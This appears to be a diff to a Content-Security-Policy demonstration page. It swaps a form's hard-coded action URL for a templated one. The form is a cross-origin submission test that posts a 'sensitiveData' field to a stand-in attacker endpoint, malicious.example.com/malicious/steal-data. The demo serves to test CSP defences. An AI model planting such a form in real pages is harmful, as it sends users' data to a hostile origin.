@@ -39,7 +39,7 @@ Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
             
             <div class="demo-form">
                 <h3>Cross-Origin Form Submission Test</h3>
-                <form action="http://malicious.example.com:3000/malicious/steal-data" method="POST" target="_blank">
+                <form action="<%= maliciousUrl %>malicious/steal-data" method="POST" target="_blank">
                     <input type="hidden" name="source" value="basic-csp.example.com">
                     <input type="text" name="sensitiveData" placeholder="Sensitive data" required>
                     <button type="submit" class="dangerous">Submit to Malicious Domain</button>
